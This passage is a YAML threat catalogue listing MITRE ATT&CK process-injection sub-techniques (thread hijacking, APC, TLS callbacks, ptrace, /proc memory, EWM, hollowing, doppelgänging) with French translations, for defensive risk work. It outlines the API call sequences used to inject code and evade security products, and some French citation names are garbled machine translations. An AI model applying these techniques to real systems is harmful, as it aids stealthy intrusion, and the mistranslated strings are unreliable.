          der \xE0 la m\xE9moire du processus, aux ressources syst\xE8me/r\xE9seau,\
          \ et \xE9ventuellement \xE0 des privil\xE8ges \xE9lev\xE9s. L\u2019ex\xE9\
          cution via injection PE peut \xE9galement \xE9chapper \xE0 la d\xE9tection\
          \ des produits de s\xE9curit\xE9 puisque l\u2019ex\xE9cution est masqu\xE9\
          e par un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.003
    ref_id: T1055.003
    name: Thread Execution Hijacking
    description: "Adversaries may inject malicious code into hijacked processes in\
      \ order to evade process-based defenses as well as possibly elevate privileges.\
      \ Thread Execution Hijacking is a method of executing arbitrary code in the\
      \ address space of a separate live process. \n\nThread Execution Hijacking is\
      \ commonly performed by suspending an existing process then unmapping/hollowing\
      \ its memory, which can then be replaced with malicious code or the path to\
      \ a DLL. A handle to an existing victim process is first created with native\
      \ Windows API calls such as <code>OpenThread</code>. At this point the process\
      \ can be suspended then written to, realigned to the injected code, and resumed\
      \ via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>,\
      \ <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation:\
      \ Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012)\
      \ but targets an existing process rather than creating a process in a suspended\
      \ state.  \n\nRunning code in the context of another process may allow access\
      \ to the process's memory, system/network resources, and possibly elevated privileges.\
      \ Execution via Thread Execution Hijacking may also evade detection from security\
      \ products since the execution is masked under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/003"
    translations:
      fr:
        name: "D\xE9tournement d\u2019ex\xE9cution de thread"
        description: "Les adversaires peuvent injecter du code malveillant dans des\
          \ processus d\xE9tourn\xE9s afin d\u2019\xE9chapper aux d\xE9fenses bas\xE9\
          es sur les processus et \xE9ventuellement d\u2019augmenter leurs privil\xE8\
          ges. Le d\xE9tournement d\u2019ex\xE9cution de thread est une m\xE9thode\
          \ d\u2019ex\xE9cution de code arbitraire dans l\u2019espace d\u2019adressage\
          \ d\u2019un processus en ligne s\xE9par\xE9. \n\nLe d\xE9tournement d\u2019\
          ex\xE9cution de thread est g\xE9n\xE9ralement r\xE9alis\xE9 en suspendant\
          \ un processus existant puis en d\xE9mappant/vidant sa m\xE9moire, ce qui\
          \ peut alors \xEAtre remplac\xE9 par du code malveillant ou le chemin vers\
          \ une DLL. Un handle vers un processus victime existant est d\u2019abord\
          \ cr\xE9\xE9 \xE0 partir d\u2019appels d\u2019API Windows natifs tels <code>qu\u2019\
          OpenThread</code>. \xC0 ce stade, le processus peut \xEAtre suspendu puis\
          \ \xE9crit, r\xE9align\xE9 sur le code inject\xE9, puis repris via <code>SuspendThread</code>,\
          \ <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>,\
          \ puis <code>ResumeThread</code> respectivement. (Citation : Injection de\
          \ proc\xE9d\xE9 \xE9lastique juillet 2017)\n\nC\u2019est tr\xE8s similaire\
          \ au [Process Hollowing](https://attack.mitre.org/techniques/T1055/012)\
          \ mais cela cible un processus existant plut\xF4t que de cr\xE9er un processus\
          \ en \xE9tat suspendu.  \n\nL\u2019ex\xE9cution du code dans le contexte\
          \ d\u2019un autre processus peut permettre d\u2019acc\xE9der \xE0 la m\xE9\
          moire du processus, aux ressources syst\xE8me/r\xE9seau, et \xE9ventuellement\
          \ \xE0 des privil\xE8ges \xE9lev\xE9s. L\u2019ex\xE9cution via le d\xE9\
          tournement d\u2019ex\xE9cution de thread peut \xE9galement \xE9chapper \xE0\
          \ la d\xE9tection des produits de s\xE9curit\xE9 puisque l\u2019ex\xE9cution\
          \ est masqu\xE9e par un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.004
    ref_id: T1055.004
    name: Asynchronous Procedure Call
    description: "Adversaries may inject malicious code into processes via the asynchronous\
      \ procedure call (APC) queue in order to evade process-based defenses as well\
      \ as possibly elevate privileges. APC injection is a method of executing arbitrary\
      \ code in the address space of a separate live process. \n\nAPC injection is\
      \ commonly performed by attaching malicious code to the APC Queue (Citation:\
      \ Microsoft APC) of a process's thread. Queued APC functions are executed when\
      \ the thread enters an alterable state.(Citation: Microsoft APC) A handle to\
      \ an existing victim process is first created with native Windows API calls\
      \ such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can\
      \ be used to invoke a function (such as <code>LoadLibrayA</code> pointing to\
      \ a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\"\
      , involves creating a suspended process in which malicious code can be written\
      \ and executed before the process' entry point (and potentially subsequent anti-malware\
      \ hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation:\
      \ ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke\
      \ malicious code previously written to the global atom table.(Citation: Microsoft\
      \ Atom Table)\n\nRunning code in the context of another process may allow access\
      \ to the process's memory, system/network resources, and possibly elevated privileges.\
      \ Execution via APC injection may also evade detection from security products\
      \ since the execution is masked under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/004"
    translations:
      fr:
        name: "Appel de proc\xE9dure asynchrone"
        description: "Les adversaires peuvent injecter du code malveillant dans les\
          \ processus via la file d\u2019attente d\u2019appels de proc\xE9dures asynchrones\
          \ (APC) afin d\u2019\xE9chapper aux d\xE9fenses bas\xE9es sur les processus\
          \ et \xE9ventuellement d\u2019\xE9lever des privil\xE8ges. L\u2019injection\
          \ de CPA est une m\xE9thode d\u2019ex\xE9cution de code arbitraire dans\
          \ l\u2019espace d\u2019adressage d\u2019un processus en direct s\xE9par\xE9\
          . \n\nL\u2019injection de CPA est g\xE9n\xE9ralement effectu\xE9e en associant\
          \ un code malveillant \xE0 la file d\u2019attente des APC (citation : Microsoft\
          \ APC) du fil d\u2019ex\xE9cution d\u2019un processus. Les fonctions APC\
          \ en file d\u2019attente sont ex\xE9cut\xE9es lorsque le thread entre dans\
          \ un \xE9tat modifiable. (Citation : Microsoft APC) Un handle vers un processus\
          \ victime existant est d\u2019abord cr\xE9\xE9 \xE0 partir d\u2019appels\
          \ d\u2019API Windows natifs tels <code>qu\u2019OpenThread</code>. \xC0 ce\
          \ stade<code>, QueueUserAPC</code> peut \xEAtre utilis\xE9 pour invoquer\
          \ une fonction (comme <code>LoadLibrayA</code> pointant vers une DLL malveillante).\
          \ \n\nUne variante de l\u2019injection APC, appel\xE9e \xAB injection Early\
          \ Bird \xBB, consiste \xE0 cr\xE9er un processus suspendu dans lequel un\
          \ code malveillant peut \xEAtre \xE9crit et ex\xE9cut\xE9 avant le point\
          \ d\u2019entr\xE9e du processus (et potentiellement les hooks anti-malware\
          \ ult\xE9rieurs) via un APC. (Citation : CyberBit Early Bird avril 2018)\
          \ AtomBombing (Citation : ENSIL AtomBombing oct. 2016) est une autre variante\
          \ qui utilise des APC pour invoquer du code malveillant pr\xE9c\xE9demment\
          \ \xE9crit dans la table globale des atomes. (Citation : Microsoft Atom\
          \ Table)\n\nL\u2019ex\xE9cution du code dans le contexte d\u2019un autre\
          \ processus peut permettre d\u2019acc\xE9der \xE0 la m\xE9moire du processus,\
          \ aux ressources syst\xE8me/r\xE9seau, et \xE9ventuellement \xE0 des privil\xE8\
          ges \xE9lev\xE9s. L\u2019ex\xE9cution par injection de CPA peut \xE9galement\
          \ \xE9chapper \xE0 la d\xE9tection des produits de s\xE9curit\xE9 puisque\
          \ l\u2019ex\xE9cution est masqu\xE9e par un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.005
    ref_id: T1055.005
    name: Thread Local Storage
    description: "Adversaries may inject malicious code into processes via thread\
      \ local storage (TLS) callbacks in order to evade process-based defenses as\
      \ well as possibly elevate privileges. TLS callback injection is a method of\
      \ executing arbitrary code in the address space of a separate live process.\
      \ \n\nTLS callback injection involves manipulating pointers inside a portable\
      \ executable (PE) to redirect a process to malicious code before reaching the\
      \ code's legitimate entry point. TLS callbacks are normally used by the OS to\
      \ setup and/or cleanup data used by threads. Manipulating TLS callbacks may\
      \ be performed by allocating and writing to specific offsets within a process\u2019\
      \ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055)\
      \ techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation:\
      \ FireEye TLS Nov 2017)\n\nRunning code in the context of another process may\
      \ allow access to the process's memory, system/network resources, and possibly\
      \ elevated privileges. Execution via TLS callback injection may also evade detection\
      \ from security products since the execution is masked under a legitimate process.\n\
      https://attack.mitre.org/techniques/T1055/005"
    translations:
      fr:
        name: Stockage local de thread
        description: "Les adversaires peuvent injecter du code malveillant dans les\
          \ processus via des rappels de stockage local de thread (TLS) afin d\u2019\
          \xE9chapper aux d\xE9fenses bas\xE9es sur les processus et \xE9ventuellement\
          \ d\u2019augmenter les privil\xE8ges. L\u2019injection de rappel TLS est\
          \ une m\xE9thode d\u2019ex\xE9cution de code arbitraire dans l\u2019espace\
          \ d\u2019adressage d\u2019un processus en direct s\xE9par\xE9. \n\nL\u2019\
          injection de rappel TLS consiste \xE0 manipuler des pointeurs \xE0 l\u2019\
          int\xE9rieur d\u2019un ex\xE9cutable portable (PE) pour rediriger un processus\
          \ vers un code malveillant avant d\u2019atteindre le point d\u2019entr\xE9\
          e l\xE9gitime du code. Les callbacks TLS sont normalement utilis\xE9s par\
          \ le syst\xE8me d\u2019exploitation pour configurer et/ou nettoyer les donn\xE9\
          es utilis\xE9es par les threads. La manipulation des rappels TLS peut \xEA\
          tre r\xE9alis\xE9e en allouant et en \xE9crivant sur des d\xE9calages sp\xE9\
          cifiques dans l\u2019espace m\xE9moire d\u2019un processus en utilisant\
          \ d\u2019autres techniques de [Process Injection](https://attack.mitre.org/techniques/T1055)\
          \ telles que [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).\
          \ (Citation : FireEye TLS nov. 2017)\n\nL\u2019ex\xE9cution du code dans\
          \ le contexte d\u2019un autre processus peut permettre d\u2019acc\xE9der\
          \ \xE0 la m\xE9moire du processus, aux ressources syst\xE8me/r\xE9seau,\
          \ et \xE9ventuellement \xE0 des privil\xE8ges \xE9lev\xE9s. L\u2019ex\xE9\
          cution via l\u2019injection de rappel TLS peut \xE9galement \xE9chapper\
          \ \xE0 la d\xE9tection des produits de s\xE9curit\xE9 puisque l\u2019ex\xE9\
          cution est masqu\xE9e par un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.008
    ref_id: T1055.008
    name: Ptrace System Calls
    description: "Adversaries may inject malicious code into processes via ptrace\
      \ (process trace) system calls in order to evade process-based defenses as well\
      \ as possibly elevate privileges. Ptrace system call injection is a method of\
      \ executing arbitrary code in the address space of a separate live process.\
      \ \n\nPtrace system call injection involves attaching to and modifying a running\
      \ process. The ptrace system call enables a debugging process to observe and\
      \ control another process (and each individual thread), including changing memory\
      \ and register values.(Citation: PTRACE man) Ptrace system call injection is\
      \ commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>)\
      \ then invoking that memory with <code>PTRACE_SETREGS</code> to set the register\
      \ containing the next instruction to execute. Ptrace system call injection can\
      \ also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>,\
      \ which copy data to a specific address in the target processes\u2019 memory\
      \ (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation:\
      \ Medium Ptrace JUL 2018) \n\nPtrace system call injection may not be possible\
      \ targeting processes that are non-child processes and/or have higher-privileges.(Citation:\
      \ BH Linux Inject) \n\nRunning code in the context of another process may allow\
      \ access to the process's memory, system/network resources, and possibly elevated\
      \ privileges. Execution via ptrace system call injection may also evade detection\
      \ from security products since the execution is masked under a legitimate process.\n\
      https://attack.mitre.org/techniques/T1055/008"
    translations:
      fr:
        name: "Appels syst\xE8me Ptrace"
        description: "Les adversaires peuvent injecter du code malveillant dans les\
          \ processus via des appels syst\xE8me ptrace (process trace) afin d\u2019\
          \xE9chapper aux d\xE9fenses bas\xE9es sur les processus et \xE9ventuellement\
          \ d\u2019augmenter des privil\xE8ges. L\u2019injection d\u2019appel syst\xE8\
          me Ptrace est une m\xE9thode d\u2019ex\xE9cution de code arbitraire dans\
          \ l\u2019espace d\u2019adressage d\u2019un processus en ligne s\xE9par\xE9\
          . \n\nL\u2019injection d\u2019appel syst\xE8me Ptrace consiste \xE0 attacher\
          \ et modifier un processus en cours d\u2019ex\xE9cution. L\u2019appel du\
          \ syst\xE8me ptrace permet \xE0 un processus de d\xE9bogage d\u2019observer\
          \ et de contr\xF4ler un autre processus (et chaque thread individuel), y\
          \ compris la modification des valeurs m\xE9moire et registre. (Citation\
          \ : Homme de PTRACE) L\u2019injection d\u2019appel syst\xE8me Ptrace est\
          \ g\xE9n\xE9ralement r\xE9alis\xE9e en \xE9crivant un code arbitraire dans\
          \ un processus en cours (ex. : <code>malloc</code>), puis en invoquant cette\
          \ m\xE9moire avec <code>PTRACE_SETREGS</code> pour d\xE9finir l\u2019ex\xE9\
          cution du registre contenant l\u2019instruction suivante. L\u2019injection\
          \ d\u2019appels syst\xE8me ptrace peut \xE9galement \xEAtre r\xE9alis\xE9\
          e avec <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, qui copient\
          \ les donn\xE9es vers une adresse sp\xE9cifique dans la m\xE9moire des processus\
          \ cibles (ex. : l\u2019adresse actuelle de l\u2019instruction suivante).\
          \ (Citation : Homme de PTRACE)(Citation : Medium Ptrace JUIL 2018) \n\n\
          L\u2019injection d\u2019appel syst\xE8me Ptrace peut ne pas \xEAtre possible\
          \ en ciblant des processus non-enfants et/ou disposant de privil\xE8ges\
          \ sup\xE9rieurs. (Citation : BH Linux Inject) \n\nL\u2019ex\xE9cution du\
          \ code dans le contexte d\u2019un autre processus peut permettre d\u2019\
          acc\xE9der \xE0 la m\xE9moire du processus, aux ressources syst\xE8me/r\xE9\
          seau, et \xE9ventuellement \xE0 des privil\xE8ges \xE9lev\xE9s. L\u2019\
          ex\xE9cution via l\u2019injection d\u2019appel syst\xE8me ptrace peut \xE9\
          galement \xE9chapper \xE0 la d\xE9tection des produits de s\xE9curit\xE9\
          \ puisque l\u2019ex\xE9cution est masqu\xE9e par un processus l\xE9gitime.\n\
          https://attack.mitre.org/techniques/T1055/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.009
    ref_id: T1055.009
    name: Proc Memory
    description: "Adversaries may inject malicious code into processes via the /proc\
      \ filesystem in order to evade process-based defenses as well as possibly elevate\
      \ privileges. Proc memory injection is a method of executing arbitrary code\
      \ in the address space of a separate live process. \n\nProc memory injection\
      \ involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>)\
      \ then crafting a return-oriented programming (ROP) payload with available gadgets/instructions.\
      \ Each running process has its own directory, which includes memory mappings.\
      \ Proc memory injection is commonly performed by overwriting the target processes\u2019\
      \ stack using memory mappings provided by the /proc filesystem. This information\
      \ can be used to enumerate offsets (including the stack) and gadgets (or instructions\
      \ within the program that can be used to build a malicious payload) otherwise\
      \ hidden by process memory protections such as address space layout randomization\
      \ (ASLR). Once enumerated, the target processes\u2019 memory map within <code>/proc/[pid]/maps</code>\
      \ can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux\
      \ Injection)(Citation: DD Man) \n\nOther techniques such as [Dynamic Linker\
      \ Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate\
      \ a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012),\
      \ proc memory injection may target child processes (such as a backgrounded copy\
      \ of sleep).(Citation: GDS Linux Injection) \n\nRunning code in the context\
      \ of another process may allow access to the process's memory, system/network\
      \ resources, and possibly elevated privileges. Execution via proc memory injection\
      \ may also evade detection from security products since the execution is masked\
      \ under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/009"
    translations:
      fr:
        name: "M\xE9moire de Proc"
        description: "Les adversaires peuvent injecter du code malveillant dans les\
          \ processus via le syst\xE8me de fichiers /proc afin d\u2019\xE9chapper\
          \ aux d\xE9fenses bas\xE9es sur les processus et \xE9ventuellement d\u2019\
          augmenter leurs privil\xE8ges. L\u2019injection de m\xE9moire proc est une\
          \ m\xE9thode d\u2019ex\xE9cution de code arbitraire dans l\u2019espace d\u2019\
          adressage d\u2019un processus en ligne distinct. \n\nL\u2019injection de\
          \ m\xE9moire proc consiste \xE0 \xE9num\xE9rer la m\xE9moire d\u2019un processus\
          \ via le syst\xE8me de fichiers /proc (<code>/proc/[pid]</code>), puis \xE0\
          \ concevoir une charge utile de programmation orient\xE9e retour (ROP) avec\
          \ les gadgets/instructions disponibles. Chaque processus en cours d\u2019\
          ex\xE9cution poss\xE8de son propre r\xE9pertoire, qui inclut des mappages\
          \ m\xE9moire. L\u2019injection de m\xE9moire proc est g\xE9n\xE9ralement\
          \ r\xE9alis\xE9e en \xE9crasant la pile des processus cibles \xE0 l\u2019\
          aide de correspondances m\xE9moire fournies par le syst\xE8me de fichiers\
          \ /proc. Ces informations peuvent \xEAtre utilis\xE9es pour \xE9num\xE9\
          rer les d\xE9calages (y compris la pile) et les gadgets (ou les instructions\
          \ du programme pouvant \xEAtre utilis\xE9es pour construire une charge utile\
          \ malveillante) autrement cach\xE9s par des protections m\xE9moire de processus\
          \ telles que la randomisation de disposition de l\u2019espace d\u2019adressage\
          \ (ASLR). Une fois \xE9num\xE9r\xE9e, la carte m\xE9moire des processus\
          \ cibles dans <code>/proc/[pid]/</code>maps peut \xEAtre \xE9cras\xE9e via\
          \ dd. (Citation : Aiguille non inform\xE9e)(Citation : GDS Linux Injection)(Citation\
          \ : DD Man) \n\nD\u2019autres techniques telles que le [d\xE9tournement\
          \ dynamique par liaison](https://attack.mitre.org/techniques/T1574/006)\
          \ peuvent \xEAtre utilis\xE9es pour remplir un processus cible avec plus\
          \ de gadgets disponibles. \xC0 l\u2019instar de [Process Hollowing](https://attack.mitre.org/techniques/T1055/012),\
          \ l\u2019injection de m\xE9moire par d\xE9clenchement peut cibler des processus\
          \ enfants (comme une copie en arri\xE8re-plan de la veille). (Citation :\
          \ Injection Linux GDS) \n\nL\u2019ex\xE9cution du code dans le contexte\
          \ d\u2019un autre processus peut permettre d\u2019acc\xE9der \xE0 la m\xE9\
          moire du processus, aux ressources syst\xE8me/r\xE9seau, et \xE9ventuellement\
          \ \xE0 des privil\xE8ges \xE9lev\xE9s. L\u2019ex\xE9cution via l\u2019injection\
          \ de m\xE9moire par proc\xE9dure peut \xE9galement \xE9chapper \xE0 la d\xE9\
          tection des produits de s\xE9curit\xE9 puisque l\u2019ex\xE9cution est masqu\xE9\
          e par un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.011
    ref_id: T1055.011
    name: Extra Window Memory Injection
    description: "Adversaries may inject malicious code into process via Extra Window\
      \ Memory (EWM) in order to evade process-based defenses as well as possibly\
      \ elevate privileges. EWM injection is a method of executing arbitrary code\
      \ in the address space of a separate live process. \n\nBefore creating a window,\
      \ graphical Windows-based processes must prescribe to or register a windows\
      \ class, which stipulate appearance and behavior (via windows procedures, which\
      \ are functions that handle input/output of data).(Citation: Microsoft Window\
      \ Classes) Registration of new windows classes can include a request for up\
      \ to 40 bytes of EWM to be appended to the allocated memory of each instance\
      \ of that class. This EWM is intended to store data specific to that window\
      \ and has specific application programming interface (API) functions to set\
      \ and get its value. (Citation: Microsoft GetWindowLong function) (Citation:\
      \ Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough\
      \ to store a 32-bit pointer and is often used to point to a windows procedure.\
      \ Malware may possibly utilize this memory location in part of an attack chain\
      \ that includes writing code to shared sections of the process\u2019s memory,\
      \ placing a pointer to the code in EWM, then invoking execution by returning\
      \ execution control to the address in the process\u2019s EWM.\n\nExecution granted\
      \ through EWM injection may allow access to both the target process's memory\
      \ and possibly elevated privileges. Writing payloads to shared sections also\
      \ avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code>\
      \ and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July\
      \ 2017) More sophisticated malware samples may also potentially bypass protection\
      \ mechanisms such as data execution prevention (DEP) by triggering a combination\
      \ of windows procedures and other system functions that will rewrite the malicious\
      \ payload inside an executable portion of the target process.  (Citation: MalwareTech\
      \ Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\
      \nRunning code in the context of another process may allow access to the process's\
      \ memory, system/network resources, and possibly elevated privileges. Execution\
      \ via EWM injection may also evade detection from security products since the\
      \ execution is masked under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/011"
    translations:
      fr:
        name: "Injection de m\xE9moire par fen\xEAtre suppl\xE9mentaire"
        description: "Les adversaires peuvent injecter du code malveillant dans le\
          \ processus via la m\xE9moire de fen\xEAtre suppl\xE9mentaire (EWM) afin\
          \ d\u2019\xE9chapper aux d\xE9fenses bas\xE9es sur le processus et \xE9\
          ventuellement d\u2019augmenter leurs privil\xE8ges. L\u2019injection EWM\
          \ est une m\xE9thode d\u2019ex\xE9cution de code arbitraire dans l\u2019\
          espace d\u2019adressage d\u2019un processus en direct distinct. \n\nAvant\
          \ de cr\xE9er une fen\xEAtre, les processus graphiques bas\xE9s sur Windows\
          \ doivent prescrire ou enregistrer une classe Windows, qui stipule l\u2019\
          apparence et le comportement (via les proc\xE9dures Windows, qui sont des\
          \ fonctions qui g\xE8rent l\u2019entr\xE9e/sortie des donn\xE9es). (Citation\
          \ : Microsoft Window Classes) L\u2019enregistrement de nouvelles classes\
          \ Windows peut inclure une demande d\u2019ajout jusqu\u2019\xE0 40 octets\
          \ d\u2019EWM \xE0 la m\xE9moire allou\xE9e de chaque instance de cette classe.\
          \ Ce EWM est destin\xE9 \xE0 stocker des donn\xE9es sp\xE9cifiques \xE0\
          \ cette fen\xEAtre et poss\xE8de des fonctions sp\xE9cifiques d\u2019interface\
          \ de programmation d\u2019applications (API) pour d\xE9finir et en tirer\
          \ la valeur. (Citation : fonction Microsoft GetWindowLong) (Citation : fonction\
          \ Microsoft SetWindowLong)\n\nBien que petit, l\u2019EWM est suffisamment\
          \ grand pour stocker un pointeur 32 bits et est souvent utilis\xE9 pour\
          \ pointer vers une proc\xE9dure Windows. Les logiciels malveillants peuvent\
          \ utiliser cet emplacement m\xE9moire dans une partie d\u2019une cha\xEE\
          ne d\u2019attaques qui inclut l\u2019\xE9criture de code dans des sections\
          \ partag\xE9es de la m\xE9moire du processus, l\u2019ajout d\u2019un pointeur\
          \ au code dans EWM, puis l\u2019ex\xE9cution en restituant le contr\xF4\
          le d\u2019ex\xE9cution \xE0 l\u2019adresse dans l\u2019EWM du processus.\n\
          \nL\u2019ex\xE9cution accord\xE9e par injection EWM peut permettre d\u2019\
          acc\xE9der \xE0 la fois \xE0 la m\xE9moire du processus cible et \xE9ventuellement\
          \ \xE0 des privil\xE8ges \xE9lev\xE9s. L\u2019\xE9criture de charges utiles\
          \ dans des sections partag\xE9es \xE9vite \xE9galement l\u2019utilisation\
          \ d\u2019appels API hautement surveill\xE9s tels que <code>WriteProcessMemory</code>\
          \ et <code>CreateRemoteThread</code>. (Citation : Injection de proc\xE9\
          d\xE9 \xE9lastique juillet 2017) Des exemples de logiciels malveillants\
          \ plus sophistiqu\xE9s peuvent \xE9galement potentiellement contourner des\
          \ m\xE9canismes de protection tels que la pr\xE9vention de l\u2019ex\xE9\
          cution de donn\xE9es (DEP) en d\xE9clenchant une combinaison de proc\xE9\
          dures Windows et d\u2019autres fonctions syst\xE8me qui r\xE9\xE9crivent\
          \ la charge utile malveillante \xE0 l\u2019int\xE9rieur d\u2019une partie\
          \ ex\xE9cutable du processus cible.  (Citation : MalwareTech Power Loader\
          \ ao\xFBt 2013) (Citation : WeLiveSecurity Gapz et Redyms mars 2013)\n\n\
          L\u2019ex\xE9cution du code dans le contexte d\u2019un autre processus peut\
          \ permettre d\u2019acc\xE9der \xE0 la m\xE9moire du processus, aux ressources\
          \ syst\xE8me/r\xE9seau, et \xE9ventuellement \xE0 des privil\xE8ges \xE9\
          lev\xE9s. L\u2019ex\xE9cution via injection EWM peut \xE9galement \xE9chapper\
          \ \xE0 la d\xE9tection des produits de s\xE9curit\xE9 puisque l\u2019ex\xE9\
          cution est masqu\xE9e par un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.012
    ref_id: T1055.012
    name: Process Hollowing
    description: "Adversaries may inject malicious code into suspended and hollowed\
      \ processes in order to evade process-based defenses. Process hollowing is a\
      \ method of executing arbitrary code in the address space of a separate live\
      \ process.  \n\nProcess hollowing is commonly performed by creating a process\
      \ in a suspended state then unmapping/hollowing its memory, which can then be\
      \ replaced with malicious code. A victim process can be created with native\
      \ Windows API calls such as <code>CreateProcess</code>, which includes a flag\
      \ to suspend the processes primary thread. At this point the process can be\
      \ unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>\
      \  before being written to, realigned to the injected code, and resumed via\
      \ <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>,\
      \ then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation:\
      \ Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local\
      \ Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new\
      \ process rather than targeting an existing process. This behavior will likely\
      \ not result in elevated privileges since the injected process was spawned from\
      \ (and thus inherits the security context) of the injecting process. However,\
      \ execution via process hollowing may also evade detection from security products\
      \ since the execution is masked under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/012"
    translations:
      fr:
        name: "Creusement des proc\xE9d\xE9s"
        description: "Les adversaires peuvent injecter du code malveillant dans des\
          \ processus suspendus et vid\xE9s afin d\u2019\xE9chapper aux d\xE9fenses\
          \ bas\xE9es sur les processus. Le creux de processus est une m\xE9thode\
          \ d\u2019ex\xE9cution de code arbitraire dans l\u2019espace d\u2019adressage\
          \ d\u2019un processus en direct s\xE9par\xE9.  \n\nLe creusement de processus\
          \ est g\xE9n\xE9ralement r\xE9alis\xE9 en cr\xE9ant un processus en \xE9\
          tat suspendu puis en d\xE9mappant/vidant sa m\xE9moire, qui peut ensuite\
          \ \xEAtre remplac\xE9 par du code malveillant. Un processus victime peut\
          \ \xEAtre cr\xE9\xE9 avec des appels d\u2019API Windows natifs tels que\
          \ <code>CreateProcess</code>, qui inclut un drapeau pour suspendre le thread\
          \ principal du processus. \xC0 ce stade, le processus peut \xEAtre d\xE9\
          cart\xE9 via des appels API tels que <code>ZwUnmapViewOfSection</code> ou\
          \ <code>NtUnmapViewOfSection</code> avant d\u2019\xEAtre \xE9crit, r\xE9\
          align\xE9 sur le code inject\xE9, puis repris via <code>VirtualAllocEx</code>,\
          \ <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, puis <code>ResumeThread</code>\
          \ respectivement. (Citation : Leitch Hollowing)(Citation : Injection de\
          \ proc\xE9d\xE9 \xE9lastique juillet 2017)\n\nC\u2019est tr\xE8s similaire\
          \ \xE0 [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005)\
          \ mais cela cr\xE9e un nouveau processus plut\xF4t que de cibler un processus\
          \ existant. Ce comportement ne conduira probablement pas \xE0 des privil\xE8\
          ges \xE9lev\xE9s puisque le processus inject\xE9 provient (et h\xE9rite\
          \ donc du contexte de s\xE9curit\xE9) du processus injecteur. Cependant,\
          \ l\u2019ex\xE9cution via le videment des processus peut \xE9galement \xE9\
          chapper \xE0 la d\xE9tection des produits de s\xE9curit\xE9 puisque l\u2019\
          ex\xE9cution est masqu\xE9e sous un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.013
    ref_id: T1055.013
    name: "Process Doppelg\xE4nging"
    description: "Adversaries may inject malicious code into process via process doppelg\xE4\
      nging in order to evade process-based defenses as well as possibly elevate privileges.\
      \ Process doppelg\xE4nging is a method of executing arbitrary code in the address\
      \ space of a separate live process. \n\nWindows Transactional NTFS (TxF) was\
      \ introduced in Vista as a method to perform safe file operations. (Citation:\
      \ Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle\
      \ to write to a file at a given time. Until the write handle transaction is\
      \ terminated, all other handles are isolated from the writer and may only read\
      \ the committed version of the file that existed at the time the handle was\
      \ opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF\
      \ performs an automatic rollback if the system or application fails during a\
      \ write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated,\
      \ the TxF application programming interface (API) is still enabled as of Windows\
      \ 10. (Citation: BlackHat Process Doppelg\xE4nging Dec 2017)\n\nAdversaries\
      \ may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055).\
      \ Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012),\
      \ process doppelg\xE4nging involves replacing the memory of a legitimate process,\
      \ enabling the veiled execution of malicious code that may evade defenses and\
      \ detection. Process doppelg\xE4nging's use of TxF also avoids the use of highly-monitored\
      \ API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>,\
      \ and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelg\xE4\
      nging Dec 2017)\n\nProcess Doppelg\xE4nging is implemented in 4 steps (Citation:\
      \ BlackHat Process Doppelg\xE4nging Dec 2017):\n\n* Transact \u2013 Create a\
      \ TxF transaction using a legitimate executable then overwrite the file with\
      \ malicious code. These changes will be isolated and only visible within the\
